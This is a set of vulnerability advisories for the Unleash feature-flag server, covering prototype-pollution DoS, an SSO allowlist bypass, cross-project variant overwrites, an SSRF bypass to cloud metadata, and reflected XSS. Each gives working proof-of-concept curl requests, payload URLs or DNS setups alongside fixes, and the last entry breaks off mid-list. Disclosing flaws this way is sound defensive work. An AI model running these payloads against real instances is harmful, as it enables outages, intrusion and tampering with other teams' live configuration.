summary: Prototype pollution via a feature flag named __proto__ crashes the Unleash server and prevents restart (persistent DoS)
description: ### Summary A feature flag whose **name** is `__proto__` poisons `Object.prototype` when the frontend/client feature cache is built. The Unleash server then crashes with an uncaught exception on the next metrics emission, and - because the poison is rebuilt from the database on every boot - it **crashes again during startup and will not come back up** while the flag remains enabled. Creating such a flag requires only ordinary project-member rights (create a flag, add a dependency, toggle it on). Archiving or deleting the flag does not recover a running process; only disabling the flag **and** restarting does. ### Details The frontend cache builder keys features by name in a plain object literal and then writes into the resolved entry: ```ts // src/lib/features/frontend-api/client-feature-toggle-read-model.ts (getAggregatedData) if (!featureTogglesByEnv[environment][featureName]) { featureTogglesByEnv[environment][featureName] = { name: featureName, strategies: [], /* … */ }; } const feature = featureTogglesByEnv[environment][featureName]; if (row.parent) { // dependency row feature.dependencies = feature.dependencies || []; feature.dependencies.push({ feature: row.parent, /* … */ }); } // …and, for a strategy row: feature.strategies = feature.strategies || []; feature.strategies.push(this.rowToStrategy(row)); ``` For a flag literally named `__proto__`, the lookup `featureTogglesByEnv[environment]['__proto__']` returns `Object.prototype` (which is truthy), so the init block is skipped and `feature` **is** `Object.prototype`. The subsequent writes therefore set **`Object.prototype.dependencies`** and **`Object.prototype.strategies`** as enumerable properties inherited by every object in the process. Two separate downstream libraries then amplify that single write into fatal errors, because both enumerate *inherited* keys: 1. **Denial of service (prom-client).** `prom-client`'s label validation uses `for (const label in labels)` (`lib/validation.js`), which walks inherited keys. Every metric whose label set lacks `dependencies` throws `Added label "dependencies" is not included in initial labelset …`. Many metrics fire on timers (scheduler jobs, event bus, request-finish, and **startup registration**), so the process dies within ~1s and then fails to restart on the startup metrics path. 2. **Integrity / data-layer corruption (knex + lodash).** The `publishUnannouncedEvents` job runs `db('events').update({ announced: true })`. Knex's `_prepUpdate` passes the payload through lodash `omitBy` → `getAllKeysIn`, which returns *own and inherited* enumerable keys, so the inherited `dependencies`/`strategies` become columns in the generated SQL: `update "events" set "announced"=$1, "dependencies"=$2, "strategies"=$3 …` → `column "dependencies" of relation "events" does not exist`. The root cause is Unleash trusting attacker-influenced strings (flag names) as keys of a plain object; the two libraries merely surface the pollution. ### Proof of concept Prerequisites: an Unleash instance; an account with project-member rights (create/toggle flags); a frontend token. **Step 1: Create a prerequisite flag (`security_poc`):** ```bash curl -s -H "$ADMIN" -H "$J" -X POST \ "$BASE/api/admin/projects/default/features" \ -d '{"name":"security_poc","type":"release"}' ``` **Step 2: Add a strategy and enable `security_poc`:** ```bash curl -s -H "$ADMIN" -H "$J" -X POST \ "$BASE/api/admin/projects/default/features/security_poc/environments/development/strategies" \ -d '{"name":"default"}' curl -s -H "$ADMIN" -X POST \ "$BASE/api/admin/projects/default/features/security_poc/environments/development/on" ``` **Step 3: Create the `__proto__` flag:** ```bash curl -s -H "$ADMIN" -H "$J" -X POST \ "$BASE/api/admin/projects/default/features" \ -d '{"name":"__proto__","type":"release"}' ``` **Step 4: Add a dependency on `security_poc`:** ```bash curl -s -H "$ADMIN" -H "$J" -X POST \ "$BASE/api/admin/projects/default/features/__proto__/dependencies" \ -d '{"feature":"security_poc"}' ``` **Step 5: Enable `__proto__` (triggers the pollution):** ```bash curl -s -H "$ADMIN" -X POST \ "$BASE/api/admin/projects/default/features/__proto__/environments/development/on" ``` **Step 6: Read the frontend API until the server stops responding:** ```bash for n in $(seq 1 15); do curl -s --max-time 3 -w '|HTTP%{http_code}\n' -H "$FRONT" "$BASE/api/frontend" done ``` Observed (official image `unleashorg/unleash-server:8.2.1`, Postgres 15): a few reads return `200`, then connection-refused. Server log shows uncaught prom-client errors such as: ``` Error: Added label "dependencies" is not included in initial labelset: [ 'endpoint', 'method' ] (startup gauge) Error: Added label "dependencies" is not included in initial labelset: [ 'jobId' ] (scheduler summary) Error: Added label "dependencies" is not included in initial labelset: [ 'toggle','project','environment','environmentType','action' ] (event counter) ``` On 8.2.1 the data layer is also hit: ``` scheduler-service - publishUnannouncedEvents update "events" set "announced"=$1, "dependencies"=$2, "strategies"=$3 where "announced"=$4 … - column "dependencies" of relation "events" does not exist ``` Restarting the container reproduces the crash during startup metrics registration - the server does not recover while `__proto__` stays enabled. ### Impact - **Availability (primary):** a persistent, full-server DoS. Both `/api/frontend` and `/api/client/features` go down with the process, and the server will not restart until the flag is disabled/removed. Requires only project-member privileges. - **Integrity (secondary):** the poisoned prototype corrupts an unrelated SQL write path, and more generally lands on every object in the process; other `for…in` / `keysIn` consumers may be affected. ### Workarounds - Reject flag names equal to `__proto__`, `constructor`, or `prototype` at the create/import API. - Restrict who may create/add-dependency/toggle flags. - Note: once triggered, disabling/removing the flag is **not** sufficient alone - the process must also be restarted. ### Suggested fix Build the per-name accumulators with `Object.create(null)` (or a `Map`), and/or guard the lookup with `Object.hasOwn(...)` instead of truthiness, so a flag name can never resolve to `Object.prototype`. This neutralizes both amplifiers without depending on prom-client/knex/lodash changes. ### References Links point at the `v8.2.1` tag. (The published `8.2.1` image was built from `015c3bc`, two commits earlier; those commits touch only `CHANGELOG.md` and the `package.json` version, so these source lines are identical in the image.) - **Root cause** - [`client-feature-toggle-read-model.ts`](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/frontend-api/client-feature-toggle-read-model.ts), `getAggregatedData`: - [L98](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/frontend-api/client-feature-toggle-read-model.ts#L98) - function definition - [L114](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/frontend-api/client-feature-toggle-read-model.ts#L114) - `if (!featureTogglesByEnv[environment][featureName])` - init block is **skipped** when `featureName === "__proto__"`, because the lookup returns `Object.prototype` (truthy) - [L128](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/frontend-api/client-feature-toggle-read-model.ts#L128) - `const feature = featureTogglesByEnv[environment][featureName]` - `feature` is now `Object.prototype` - [L131](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/frontend-api/client-feature-toggle-read-model.ts#L131) - `feature.dependencies = feature.dependencies || []` - writes `Object.prototype.dependencies` - [L145](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/frontend-api/client-feature-toggle-read-model.ts#L145) - `feature.strategies = feature.strategies || []` - writes `Object.prototype.strategies` Introduced in commit [`7b402ad`](https://github.com/Unleash/unleash/commit/7b402ad6b3280e32946850e142651e8f49b069cc) / PR [#6460](https://github.com/Unleash/unleash/pull/6460), first released in 5.11.0; renamed from `src/lib/proxy/` to `src/lib/features/frontend-api/` by PR [#6502](https://github.com/Unleash/unleash/pull/6502), logic unchanged. - **Data-layer amplifier** - [`event-store.ts`](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/events/event-store.ts): - [L768](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/events/event-store.ts#L768) `setUnannouncedToAnnounced`, [L771](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/events/event-store.ts#L771) `.update({ announced: true })`; invoked by [L778](https://github.com/Unleash/unleash/blob/v8.2.1/src/lib/features/events/event-store.ts#L778) `publishUnannouncedEvents` - Knex compiles the one-key payload via lodash [`omitBy`](https://lodash.com/docs/4.17.15#omitBy) → `getAllKeysIn` (own **and inherited** keys), materializing the inherited keys as SQL columns: `knex@3.2.10` [`lib/query/querycompiler.js#L1387-L1390`](https://github.com/knex/knex/blob/3.2.10/lib/query/querycompiler.js#L1387-L1390) (`omitBy` at L1387, `Object.keys(data)` at L1390); `lodash@4.18.1`. (Dependency versions as bundled in 8.2.1.) - **DoS amplifier** - `prom-client@15.1.3` [`lib/validation.js#L17-L22`](https://github.com/siimon/prom-client/blob/v15.1.3/lib/validation.js#L17-L22): `validateLabel` uses `for (const label in labels)` (L18), which walks inherited keys. (Bundled in 8.2.1.)

summary: SSO auto-provisioning email domain allowlist bypassable via unanchored suffix match (Enterprise)
description: ## Summary Unleash Enterprise restricts which IdP-asserted identities may be auto-provisioned an account using an `emailDomains` allowlist. The check is an unanchored suffix match performed against the whole email address, so any domain whose name merely ends with the allowlisted string satisfies it. With an allowlist of `example.com`, an identity at `evilexample.com`, `notexample.com` or `my-example.com` is auto-provisioned an account. None of those domains is related to `example.com` in any way. ## Affected * Unleash **Enterprise 8.1.0**. Verified on the `unleashorg/unleash-enterprise` image. * The defect is in the shipped Enterprise bundle (`dist/auth/provider.js`), not in the OSS tree. * Applies to SAML, and by shared code path to OIDC. We tested SAML only. * Version matrix not established. We tested 8.1.0. ## Severity Medium. CVSS v3.1 4.3, `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` CWE-1289 (Improper Validation of Unsafe Equivalence in Input), with CWE-287 (Improper Authentication) as the consequence. Scored on what we actually measured: read access to non-public project data, obtained by a principal the operator's allowlist was intended to exclude. `PR:L` because the attacker must hold a legitimate identity in the configured IdP (see Threat model). We are deliberately not claiming any integrity impact, for reasons given under "The Editor default" below. ## Threat model, stated precisely This is not an attack an anonymous internet user can mount, and we want to be accurate about that up front. We added an `--issuer` control to our test IdP to check whether an attacker could simply stand up their own identity provider: | Assertion | Result | | --- | --- | | legitimate `Issuer`, allowlisted domain | 302, accepted | | different `Issuer` (attacker's own IdP), everything else identical | 400, refused | So the issuer is pinned and the attacker cannot supply their own IdP. Every attack here requires an assertion signed by the configured IdP's private key. The IdP certificate is public and permits verification, not signing. An attacker who held the IdP private key would have no use for this bypass. They would assert an allowlisted address naming an existing administrator and obtain that account directly. This finding is not about that attacker. The realistic case is a principal who holds a **legitimate identity in the configured IdP at a domain that is not the allowlisted one**. The allowlist exists precisely to keep such a principal out of Unleash. Concrete routes to such an identity: * B2B guest or partner federation, where the IdP issues assertions for external guests carrying their own email domain. * Self-service email or UPN attributes, where the IdP permits users to set their own address. * A shared or multi-tenant IdP serving several organisations from one entity ID. In each case the assertion is genuine and correctly signed. The defect is that the operator's control over *which* vouched identities may enter does not hold. ## Details `dist/auth/provider.js:49-51`: ```js const domains = emailDomains.trim().split(/\s*,\s*/); return Boolean(domains.find((domain) => domain.length && email.toLowerCase().endsWith(domain.toLowerCase()))); ``` `String.prototype.endsWith()` is applied to the entire email address with no boundary anchor. There is no requirement that the allowlisted string be preceded by `@` or `.`, so ownership of the actual domain is never established. Note that `autoCreate` alone is inert: the code returns false unless `emailDomains` is also set. The allowlist is therefore not an optional extra, it is the deliberate security boundary limiting the blast radius of a hostile, compromised or over-broad IdP. ## PoC Environment: Unleash Enterprise 8.1.0, licensed, with SAML configured and enabled against a controlled IdP. **No login is required** for any of this: auto-provisioning happens on assertion receipt. The relevant configuration is the auto-provisioning allowlist: ``` autoCreate: true emailDomains: example.com <- the ONLY domain the operator allowlisted defaultRootRole: Viewer ``` The SSO configuration page (`/admin/auth/saml`), showing the enabled SAML integration and the trusted IdP certificate: ### Step 1: note the allowlist `example.com` is the only allowlisted domain. The operator's intent is "only my own company's users may be auto-provisioned". Auto-create is on and the default root role is Viewer: ### Step 2: mint an assertion for a domain the operator never allowlisted A domain that merely *ends with* the allowed string: ``` python3 saml_idp.py --variant valid --user attacker@evilexample.com ``` The forge we used is attached: [saml_idp.py.txt](https://github.com/user-attachments/files/31596948/saml_idp.py.txt) (rename to `saml_idp.py`; GitHub does not accept `.py` attachments). It needs `lxml` and `signxml`. It deliberately controls every byte of the assertion rather than being a working IdP. **Generate your own keypair and configure the SP to trust the certificate**; no key material is included here, and the script takes the key and certificate paths via `--key` and `--cert`. `--variant valid` emits a correctly signed, well formed assertion, which is the only variant this finding needs. Add `--send` to deliver it to `--acs` directly, or `--burp` to route it through a proxy so the request is visible. A verified-good baseline (`--user` at the allowlisted domain, which is accepted) should be run first, so that a refusal in the bypass case cannot be mistaken for a malformed assertion. `evilexample.com` is a different domain, registrable by anyone. It is not a subdomain of `example.com` and shares no ownership with it. The assertion is otherwise entirely valid and correctly signed by the configured IdP. ### Step 3: POST it to the callback `POST http://localhost:4243/auth/saml/callback` ``` callback -> 200 session issued: True AUTO-CREATED AND AUTHENTICATED AS: attacker@evilexample.com | role id 3 (Viewer) ``` The full run, showing the assertion being minted for `attacker@evilexample.com`, the callback accepting it, and `GET /api/admin/user` confirming the session is authenticated as that subject with `rootRole 3`: Two notes on reading that output. The `Recipient` and `Audience` lines, and the closing remark about the assertion naming a different service provider, relate to a **separate finding we are reporting to you alongside this one** (SAML audience and recipient are not validated); they are incidental here. What matters for *this* finding is the last line: the subject at `evilexample.com` was auto-provisioned and authenticated, against an allowlist of `example.com`. The same result reproduces with an assertion whose audience is correct, as the result matrix below shows. The administrator Users page shows `attacker@evilexample.com`, role Viewer, created that day, last login under a minute ago. The account did not exist before the request: Database confirmation: ``` id | email | created_at 11 | attacker@evilexample.com | 2026-08-16 10:29:10 ``` `GET /api/admin/user` with the issued session returns that identity, a fully authenticated session. ### Full result matrix, with negative controls Adjudicated on persisted state (was an account created) rather than on the HTTP status. | Asserted email | Real domain | Result | Account provisioned | | --- | --- | --- | --- | | `mallory@notallowed.test` | `notallowed.test` | 400 | no (negative control) | | `attacker@example.com.evil.test` | `example.com.evil.test` | 400 | no (negative control) | | `attacker@evilexample.com` | `evilexample.com` | 302 | **yes**, rootRole 3 | | `attacker@notexample.com` | `notexample.com` | 302 | **yes** | | `attacker@my-example.com` | `my-example.com` | 302 | **yes** | Both controls are refused, and refused for the right reasons, which is what makes the positives meaningful: * `notallowed.test` shares no suffix, proving the allowlist is genuinely enforced rather than accepting everything. * `example.com.evil.test` **contains** `example.com` but does not **end** with it, proving the flaw is specifically an unanchored suffix match rather than a substring match. This distinction matters for the remedy. ### Two traps for anyone reproducing this **Seat cap.** Our trial licence caps the instance at 5 seats. Once full, auto-creation fails with a 400 that is indistinguishable from the allowlist correctly rejecting the attacker. This produced a false negative on our first attempt, and the server log gave the real reason: ``` UnleashLicenseInvalidError [ForbiddenError]: You have reached the limit for seats. You currently have 5. at async SamlAuthProvider.getOrCreateUser (provider.js:66) ``` Check the seat count and read the server log before concluding the control held. **Pre-existing account.** The test address must not already exist, or the login simply matches the existing account and never exercises auto-provisioning at all. ## Impact, as measured Logged in as the auto-provisioned `attacker@evilexample.com` (role Viewer) and enumerated: | Endpoint | Result | | --- | --- | | `GET /api/admin/projects` | 200, 9 of 11 projects | | `GET /api/admin/projects/proj-a/features` | 200, 60 feature flags | | `GET /api/admin/projects/proj-a/features/{flag}` | 200, strategies, rollout %, stickiness, constraints | | `GET /api/admin/segments` | 200 | | `GET /api/admin/user-admin` | 403 | | `GET /api/admin/api-tokens` | 403 | | `GET /api/admin/auth/saml/settings` | 403 | Private projects are correctly hidden (9 visible versus 11 for admin) and administrative endpoints are correctly refused. Role enforcement itself works. The defect is purely *who gets an account*. What that read access is worth: in a feature flag system, flag names are typically descriptive of unreleased functionality, and the readable strategy detail includes rollout percentages, stickiness and targeting constraints. An outsider obtains the unreleased-feature inventory and the rollout state of each. That is commercially sensitive, but it is read-only, on non-private projects, with no administrative access. We are not characterising it as system compromise. ## The Editor default, tested rather than assumed `dist/auth/provider.js:53-61` falls back to `RoleName.EDITOR` when neither `defaultRootRoleId` nor `defaultRootRole` is configured. We tested whether that yields write access. **It assigns Editor, confirmed:** with `defaultRootRole` omitted, the provisioned outsider received role id 2 (Editor) rather than 3 (Viewer). **It did not yield write access:** every write as that Editor account was refused. | Action | Result | | --- | --- | | `POST /projects/proj-a/features` | 403 | | `POST .../flag-a/environments/development/on` | 403 | | `PUT .../strategies/{id}` | 403 | Adjudicated on persisted state: `flag-a` remained `enabled=false` with `rollout=100`, and the flag the outsider attempted to create returns 404. Nothing was written. The cause appears to be the seat model. The provisioned account carries `seatType: None` while every pre-existing user carries `seatType: Regular`, so root role and seat are separate gates. **We therefore do not claim this bypass grants write access, and have not scored any integrity impact.** Whether a production licence with genuinely free Regular seats would assign one to an SSO-provisioned user, and thereby enable writes, is an open question we could not settle on a trial licence. You are far better placed than we are to answer it, and we flag it because it decides whether this finding is information disclosure or unauthorised modification. One reproduction note: the auth path appears to read cached SAML settings, so a change to the default root role is not observed immediately. Our first attempt after changing the setting still measured the old role. ## Suggested remediation **Primary: anchor the comparison.** Compare the address's domain part for equality rather than testing a suffix of the whole string: ```js const domainOf = (email) => email.toLowerCase().split('@').pop(); const domains = emailDomains.trim().toLowerCase().split(/\s*,\s*/).filter(Boolean); const d = domainOf(email); return domains.some((allowed) => d === allowed || d.endsWith('.' + allowed)); ``` This matches the domain exactly, and optionally its subdomains, which is almost certainly the intent, while rejecting `evilexample.com` against an `example.com` allowlist. At minimum, `email.endsWith('@' + domain)`. **Secondary: audit the same pattern elsewhere.** Unanchored `endsWith` / `startsWith` / `includes` on security relevant strings is a class rather than an instance. We found the identical mistake applied to a URL elsewhere in the Enterprise build, which we are reporting to you separately as it is a licensing rather than a security control. Any other host, domain, URL or path comparison is worth the same check. **Tertiary: reconsider the default root role.** Falling back to `Editor` when unconfigured means any future auto-provisioning weakness lands on a write-capable role. `Viewer` would be the safer default with `Editor` an explicit opt-in, independent of whether the seat model currently blocks the writes. ## Disclosure Reported by Bogdan (Fortbridge). We are happy to retest a candidate fix. As the repository has no published security policy or stated disclosure timeline, we propose 90 days from this report before public disclosure, and are glad to adjust that by agreement if you need longer.

Cross-project IDOR lets a project member overwrite any feature's environment variants and payloads
description:
## Vulnerability Details

**File**: `src/lib/routes/admin-api/project/variants.ts` (`patchVariantsOnEnv`, `overwriteVariantsOnEnv`, `pushVariantsToEnvironments`)
**Routes**: `PATCH`/`PUT /api/admin/projects/:projectId/features/:featureName/environments/:environment/variants` (`permission: UPDATE_FEATURE_ENVIRONMENT_VARIANTS`) and `PUT /api/admin/projects/:projectId/features/:featureName/variants-batch` (`permission: NONE`, manually checked)
**CWE**: CWE-639 — Authorization Bypass Through User-Controlled Key
**Severity**: High
**CVSS**: 7.1 — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N

### Root Cause
None of the three write handlers in `VariantsController` verify that `:featureName` actually belongs to `:projectId` before mutating. RBAC checks the caller's permission against `projectId` (the URL segment they legitimately control), but the underlying write is executed purely by `featureName` + `environment`:
```ts
// feature-environment-store.ts
async setVariantsToFeatureEnvironments(featureName, environments, variants) {
    const records = environments.map((env) => ({ variants: variantsString, enabled: false, feature_name: featureName, environment: env }));
    await this.db(T.featureEnvs).insert(records).onConflict(['feature_name', 'environment']).merge(['variants']);
}
```
`feature_environments` (PK `(environment, feature_name)`) has no `project` column, and feature names are globally unique in Unleash, so `featureName` alone fully identifies the row regardless of `projectId`. The sibling **read** handler in the same controller file does this correctly:
```ts
async getVariantsOnEnv(req, res) {
    const { projectId, featureName, environment } = req.params;
    await this.featureService.validateFeatureBelongsToProject({ featureName, projectId });   // present here
    ...
```
This helper already exists and does exactly the right check — it was simply never called from the three write paths (`patchVariantsOnEnv`, `overwriteVariantsOnEnv`, and the `checkAccess()` used by `pushVariantsToEnvironments`).

### Attack Scenario
1. Attacker holds `UPDATE_FEATURE_ENVIRONMENT_VARIANTS` on only their own project (a routine, non-admin Owner/Editor privilege).
2. Feature reads are `permission: NONE` in OSS, so the attacker can discover a victim project's feature names.
3. Attacker sends `PUT /api/admin/projects/<attacker-project>/features/<victim-feature>/environments/<env>/variants` with a crafted variant list (including an arbitrary `payload.value`). RBAC passes (checked only against `<attacker-project>`), and the victim feature's variant configuration — served directly to every SDK client evaluating that flag — is silently overwritten.

### Impact
Full overwrite of another project's feature-flag variant weights and **payloads**, which are commonly used to deliver A/B-test content, config values, or UI copy directly to production client applications — a content/config-injection primitive into another team's live traffic, reachable by any project member with ordinary variant-edit rights on an unrelated project.

### Recommended Fix
Call the existing `validateFeatureBelongsToProject({ featureName, projectId })` helper at the top of each write handler, mirroring `getVariantsOnEnv`.

### Verification
Dynamically confirmed end-to-end in a local Docker lab (`unleashorg/unleash-server:8.1.0` + Postgres 15):
- Created a low-privilege user holding only project-scoped `UPDATE_FEATURE_ENVIRONMENT_VARIANTS` (Owner role) on the `default` project.
- Confirmed the direct cross-project attempt is correctly rejected with `403`.
- Confirmed the exploit — same attacker session, own project in the URL, victim feature name in the path — succeeds (`HTTP 200`) via both the single-environment `PUT` and the `variants-batch` endpoint, overwriting the victim feature's variant (including an injected `payload.value`), verified by direct database read.
- Hot-patched the fix into the running container, restarted, and confirmed both endpoints now correctly return `404 NotFoundError` against the same payloads, with the victim data unchanged — the fix closes both endpoints via one reused, already-existing validation helper.

summary: Cross-project overwrite of feature-flag variants via `variants-batch` (feature not bound to path project)
description:
Hello,

We're SVO (svo.com.br), reporting a broken-object-level-authorization issue in Unleash, privately and coordinated (no deadline). Confirmed at source and in a runtime PoC (isolated lab). One honest precondition is stated up front. Details and fix below.

## Summary

The `PUT /api/admin/projects/:projectId/features/:featureName/environments/variants-batch` endpoint authorizes the caller against the **`:projectId` in the path**, but never verifies that **`:featureName` actually belongs to that project**. A user with variant-write permission in *any one* project can therefore overwrite the variants of a feature flag owned by a **different** project — while a direct write to the owning project is correctly denied (403). The overwritten variant is served to that other project's SDKs (feature-config poisoning) and bypasses its change-request gate.

## Precondition (stated honestly)

This requires **more than one project** — i.e. an Unleash deployment with multi-project (Enterprise), or otherwise more than the single default project. Open-source Unleash ships a single `default` project (`POST /api/admin/projects` returns 404 on OSS). The attacker needs `UPDATE_FEATURE_ENVIRONMENT_VARIANTS` in some project they belong to, and no permission in the victim project. The **vulnerability itself — the cross-project write — is real runtime behaviour**, not a seed artifact; in our lab we seeded the second project (OSS can't create one) purely to reproduce a multi-project topology.

## Details

```ts
// src/lib/routes/admin-api/project/variants.ts:127-172
this.route({ method: 'put', path: `${PREFIX}-batch`, permission: NONE,      // route-level: delegated to handler
             handler: this.pushVariantsToEnvironments, … });
async pushVariantsToEnvironments(req, res) {
  const { projectId, featureName } = req.params;
  …
  await this.checkAccess(req.user, projectId, environments,                  // checks the PATH projectId only…
                         UPDATE_FEATURE_ENVIRONMENT_VARIANTS);
  // …:featureName is NEVER validated to belong to projectId
}

// src/lib/db/feature-environment-store.ts:441-444  (the sink)
await this.db(T.featureEnvs).insert(records)
  .onConflict(['feature_name', 'environment'])                              // keyed by feature+env only — no project
  .merge(['variants']);
```

`checkAccess` gates on the path's `projectId`; the write in `setVariantsOnEnvs` / `feature-environment-store` is keyed by `(feature_name, environment)` with no project column. Nothing ties the feature to the project the caller was authorized in.

## Proof of concept (runtime, isolated lab — Unleash OSS 8.1.0)

Project A = `default`, Project B = `proj-b`. `victim-flag` ∈ B (env `production`, variant `[baseline]`). Attacker `mallory` = project **Member in A only** (`UPDATE_FEATURE_ENVIRONMENT_VARIANTS`/production in A); no project role in B.

| Step | Action (mallory) | Expected | Observed |
|---|---|---|---|
| before | admin reads B/victim-flag/production variants | — | `[baseline]` |
| **control** | `PUT …/projects/proj-b/features/victim-flag/variants-batch` (direct to B) | deny | **403** PermissionError |
| **attack** | `PUT …/projects/default/features/victim-flag/variants-batch` (path = A, feature of B) | reject | **200** — returns variant `pwn` |
| after | admin reads B/victim-flag/production variants | — | **`[pwn, payload: attacker-controlled]`** (baseline overwritten) |

Denied on the legitimate path to B (403), mallory nonetheless overwrote B's flag through Project A's path; the change is confirmed via an independent admin read.

## Impact

A user scoped to one project can poison the feature-flag variants of any other project on the instance — the variant is what B's SDKs serve to end users (config poisoning / potential feature-gating bypass for B's application), and it circumvents B's change-request approval gate. High impact in any multi-project (Enterprise) deployment.

## Fix

Bind `:featureName` to `:projectId` before writing, in the `variants-batch` handler (and its sibling env-variant routes):

```ts
const owner = await this.featureToggleService.getProjectId(featureName);   // real owning project
if (owner !== projectId) throw new NotFoundError('feature not in project');
```

Equivalently: run `checkAccess` against the feature's **owning** project (not the path's), add `validateFeatureBelongsToProject(projectId, featureName)` in `setVariantsOnEnvs` (service defense), and key/validate the store write by `(project, feature_name, environment)`. Layer route-guard + service-validation + store-key.

We'd appreciate credit as **"SVO — svo.com.br"** if you publish; optional. Thank you for Unleash.

Best,
SVO

summary: NAT64 prefix typo + missing Teredo check in isLocalIpv6 allows SSRF guard bypass via IPv6 transition addresses (incomplete fix for GHSA-5vf6)
description:
# NAT64 prefix typo + missing Teredo check in isLocalIpv6 allows SSRF guard bypass via IPv6 transition addresses (incomplete fix for GHSA-5vf6)

## Summary

The `isLocalIpv6` function in `src/lib/addons/validate-url.ts` contains a typo in the NAT64 well-known prefix (`64:ff95::/96` instead of the correct `64:ff9b::/96` per RFC 6052) and is missing a check for Teredo tunneling addresses (`2001:0000::/32`, RFC 4380). This allows an attacker who can configure addon webhook URLs to bypass the SSRF guard introduced as a fix for GHSA-5vf6-jrqr-78fj, reaching internal services and cloud metadata endpoints via IPv6 transition addresses.

## Affected component

- **File**: [`src/lib/addons/validate-url.ts`](https://github.com/Unleash/unleash/blob/fcf51d3a500b14102514902e88b434b9928b1f2c/src/lib/addons/validate-url.ts)
- **Function**: `isLocalIpv6` (lines 22-34)
- **Consumers**: All addon types that call `fetchRetry` or `validateUrl` -- Webhook, Slack, Teams, TeamsWorkflow, Datadog, NewRelic

## Details

### Bug 1: NAT64 prefix typo

The code checks:

```typescript
ip.isInSubnet(new Address6('64:ff95::/96'))
```

The correct NAT64 well-known prefix defined in RFC 6052 is `64:ff9b::/96` (hex digit `b`, not `5`). Because of this single-character typo, any NAT64 address such as `64:ff9b::169.254.169.254` or `64:ff9b::127.0.0.1` passes the check and is treated as a public IP.

### Bug 2: Missing Teredo check

Teredo tunneling addresses (`2001:0000::/32`, RFC 4380) are not checked at all. The code checks `2001:db8::/32` (documentation) and `2002::/16` (6to4), but the `2001:0000::/32` Teredo prefix is absent. An address like `2001:0000:c0a8:0001:0000:0000:80ff:fffe` (a Teredo address with an embedded private IPv4) bypasses all checks.

## Reproduction

An authenticated user with addon configuration privileges can set a webhook URL to a hostname whose AAAA record points to a NAT64 or Teredo address:

**NAT64 bypass** (cloud metadata via typo'd prefix):
```
# Attacker controls DNS for evil.example.com:
# evil.example.com AAAA 64:ff9b::a9fe:a9fe   (= 64:ff9b::169.254.169.254)

# Configure a Webhook addon with URL: https://evil.example.com/hook
# validateUrl resolves evil.example.com -> 64:ff9b::a9fe:a9fe
# isLocalIpv6 checks isInSubnet('64:ff95::/96') -> false (ff9b != ff95)
# Request reaches 169.254.169.254 via NAT64 translation
```

**Teredo bypass** (internal network):
```
# evil.example.com AAAA 2001:0000:c0a8:0001:0000:0000:80ff:fffe
# isLocalIpv6 has no check for 2001:0000::/32
# Address is treated as public
```

## Impact

An attacker who can configure addon integrations (Webhook, Slack, Teams, Datadog, New Relic) can reach internal services, cloud metadata endpoints (169.254.169.254), and other private network resources via the addon webhook delivery mechanism. This is an incomplete fix for GHSA-5vf6-jrqr-78fj.

## Suggested fix

```typescript
// Fix 1: Correct the NAT64 typo
ip.isInSubnet(new Address6('64:ff9b::/96'))   // was '64:ff95::/96'

// Fix 2: Add Teredo check
ip.isInSubnet(new Address6('2001::/32'))       // Teredo tunneling (RFC 4380)

// Fix 3 (optional): Add local-use NAT64 prefix
ip.isInSubnet(new Address6('64:ff9b:1::/48')) // local-use NAT64 (RFC 8215)
```

## Credit

tonghuaroot (https://github.com/tonghuaroot)

summary: Reflected XSS in the admin email-preview endpoint
description:
## Summary

`GET /api/admin/email/preview/html/:template` takes the **entire query string** as the template render context and returns it **without HTML escaping**, this leads to XSS vulnerabilities that can be exploited. `:template` is a path parameter and **all 7 mail templates are affected — 14 injectable parameters in total**, each confirmed with a live request.

Although Unleash uses the HttpOnly flag to protect cookies, alternative exploitation vectors still allow for account takeover—such as using injected <script> tags to send API requests that generate Personal API token and send back to attacker server.

## Impact

An attacker can conduct phishing attacks targeting admin. If an admin clicks on the link, the attacker can obtain sensitive data and gain unauthorized access to admin API access.

## Affected code

| | |
|---|---|
| `src/lib/routes/admin-api/email.ts` | `const ctx = req.query` — no validation, no allow-list, no OpenAPI schema |
| `src/lib/services/email-service.ts` | render sink |
| `src/mailtemplates/*/*.html.mustache` | unescaped `{{{ }}}` slots in **every** template |

`:template` is a path parameter, so this is not a single URL. **All 7 mail templates are affected — 14 injectable parameters in total.**

| URL — `GET /api/admin/email/preview/html/…` | Injectable query parameters | Context |
|---|---|---|
| `getting-started` | `passwordLink`, `unleashUrl` | `href` attribute |
| `order-environments` | `customerId`, `userEmail` | element text |
| `productivity-report` | `flagsCreatedTrendMessage`, `productionUpdatedTrendMessage`, `technicalDebtTrendMessage` | element text |
| `requested-cr-approval` | `changeRequestLink` | `href` attribute |
| `reset-password` | `resetLink` | `href` attribute |
| `scheduled-change-conflict` | `conflictingChangeRequestLink` | `href` attribute |
| `scheduled-execution-failed` | `changeRequestTitle`, `scheduledAt`, `errorMessage` | element text |
| `scheduled-execution-failed` | `changeRequestLink` | `href` attribute |


**Worth reviewing separately:** the same templates are rendered by the email **send** path (`email-service.ts`). Wherever a value interpolated into one of these `{{{ }}}` slots originates from user-supplied data, the delivered email body carries injected markup as well.

## Proof of concept
1. Login by admin user account and open the requests bellow.  --> XSS popup will open
```
http://TARGET/api/admin/email/preview/html/getting-started?passwordLink=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

http://TARGET/api/admin/email/preview/html/order-environments?customerId=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

http://TARGET/api/admin/email/preview/html/productivity-report?flagsCreatedTrendMessage=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

http://TARGET/api/admin/email/preview/html/requested-cr-approval?changeRequestLink=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

http://TARGET/api/admin/email/preview/html/reset-password?resetLink=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

